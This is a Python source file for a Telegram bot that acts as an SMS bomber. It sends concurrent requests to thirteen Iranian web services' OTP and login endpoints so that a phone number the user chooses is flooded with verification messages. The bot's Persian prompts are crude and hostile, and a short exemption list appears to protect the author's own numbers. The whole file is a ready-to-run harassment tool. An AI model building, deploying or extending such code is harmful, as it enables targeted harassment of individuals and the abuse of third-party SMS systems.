import os
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from flask import Flask

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

SERVICES = {
    'digikala': lambda num: requests.post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    
    ),
    'divar': lambda num: requests.post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),
    'olgorock': lambda num: requests.post(
        url="https://api.algorock.com/api/Auth",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
    'snapp_digital': lambda num: requests.post(
        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        json={"cellphone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'paresh': lambda num: requests.post(
        url="https://api.paresh.ir/api/user/otp/code/",
        json={"phone_number": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'tapsishop': lambda num: requests.post(
        url="https://tapsi.shop/api/proxy/authCustomer/CreateOtpForRegister",
        json={"user": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'talasi': lambda num: requests.post(
        url="https://api.talasea.ir/api/auth/sentOTP",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'filmnet': lambda num: requests.get(
        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'torob': lambda num: requests.get(
        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'alopeyk': lambda num: requests.post(
        url="https://alopeyk.com/api/sms/send.php",
        json={"phone": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),

    'okala': lambda num: requests.post(
        url="https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False

    ),



    'shab': lambda num: requests.post(
        url="https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
        json={"mobile": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False


    ),



    'karafs': lambda num: requests.post(
        url="https://v2.karafsapp.com/requestCode",
        json={"phoneNumber": num},
        headers={"Content-Type": "application/json"},
        timeout=5,
        verify=False
    ),
}

user_sessions = {}
blocked_numbers = {
    "09224005771",
    "09182649455",
    "09059250020",
    "09180520256"
    
}

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "به بمبر دکتر ERROR خوش اومدي ")

@bot.message_handler(commands=['bomb'])
def bomb(message):
    user_sessions[message.chat.id] = "waiting_phone"
    bot.send_message(message.chat.id, "شماره بده بيبي تا بگامش:")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    chat_id = message.chat.id
    
    if chat_id in user_sessions and user_sessions[chat_id] == "waiting_phone":
        phone = message.text.strip()
        
        
        if phone in blocked_numbers:
            bot.send_message(chat_id, "چي فکر کردي عبو سوفيان ؟")
            gif = "https://uploadkon.ir/uploads/8d1624_25animation-2025-01-08-01-46-01-7516145351561052176.mp4"
            bot.send_animation(chat_id, gif)
            del user_sessions[chat_id]
            return        
        user_sessions[chat_id] = "processing"
        
        progress_msg = bot.send_message(chat_id, "در حال ارسال...")
        
        success = 0
        failed = 0
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(service, phone): name for name, service in SERVICES.items()}
            
            for future in as_completed(futures):
                name = futures[future]
                try:
                    response = future.result()
                    if response.status_code in [200, 201, 202, 204]:
                        success += 1
                    else:
                        failed += 1
                except:
                    failed += 1
        
        bot.edit_message_text(
            f"ارسال شد\nموفق: {success}\nناموفق: {failed}",
            chat_id=chat_id,
            message_id=progress_msg.message_id
        )
        
        del user_sessions[chat_id]

@app.route('/')
def home():
    return "Bot is running"

@app.route('/health')
def health():
    return "OK"

def run_flask():
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))

if __name__ == "__main__":
    import threading
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    bot.infinity_polling()
